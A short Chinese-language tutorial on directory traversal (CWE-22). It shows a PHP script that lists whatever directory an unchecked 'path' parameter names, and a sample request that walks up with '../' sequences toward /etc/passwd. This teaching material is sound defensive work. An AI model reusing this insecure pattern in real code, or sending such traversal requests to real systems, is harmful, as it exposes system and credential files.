#任意目录遍历漏洞
一般与任意文件上传漏洞一起组合使用,说明[参见](http://cwe.mitre.org/data/definitions/22.html)

## 常见例子
有如下PHP脚本`demo.php`,进行目录的遍历:

```
<?php
if(array_key_exists('path', $_GET)){
   $path = $_GET['path'];
}else{
   $path = '../';
}
echo "<ul>";
foreach (new DirectoryIterator($path) as $fileinfo) {
  if($fileinfo->isDot()){
    continue;
  }
  echo "<li>".$fileinfo->getFilename()."</li>";
}
echo "</ul>";
```

通过下面的方式进行访问:

<pre>
http://localhost/demo.php?path=../../../../../../../../../../../../../../../etc/passwd
</pre>